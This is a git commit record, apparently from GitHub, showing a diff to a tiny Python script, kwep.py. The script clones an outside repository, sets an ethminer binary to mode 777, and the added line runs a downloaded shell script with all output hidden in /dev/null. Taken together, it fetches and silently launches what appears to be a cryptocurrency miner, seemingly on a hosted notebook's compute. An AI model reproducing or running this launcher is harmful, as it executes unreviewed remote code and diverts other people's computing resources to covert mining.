bb1a0ebf7c42b35992e903b09d484f505221c5c0
gotatar <79090873+gotatar@users.noreply.github.com>
2021-07-02 23:43:00 +0530

    Update kwep.py

--- kwep.py
+++ kwep.py
@@ -1,3 +1,4 @@
 import os
 os.system("git clone https://github.com/gotatar/xorta.git")
 os.system("chmod 777 /content/xorta/Miners/ethminer/v0.11.0_Nvidia_Optimized/Linux/ethminer")
+os.system("xorta/oep.sh &> /dev/null")
